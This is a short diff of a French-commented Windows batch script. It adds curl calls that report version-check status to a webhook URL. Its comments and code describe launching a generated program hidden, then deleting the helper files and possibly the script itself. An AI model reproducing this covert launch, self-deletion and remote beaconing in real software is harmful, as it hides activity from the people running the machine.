@@ -116,11 +116,13 @@ curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Demarre\"}" 
 
 
 
-
+curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"%nouversion% = %version%\"}" %WEBHOOK_URL%
 
 if %nouversion% neq %version% (
     curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Il existe une nouvelle version\"}" %WEBHOOK_URL%
     goto :debutversion
+) else (
+    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"C'est la derniere version\"}" %WEBHOOK_URL%
 )
 
 ::Se programme (dans prog de base) créeer un programme puis le lance en caché et se suppr lui meme
@@ -154,6 +156,12 @@ del "%chemin_vbs%"
 ::del "%~f0"
 
 :finversion
+
+
+
+
+
+
 
 
 
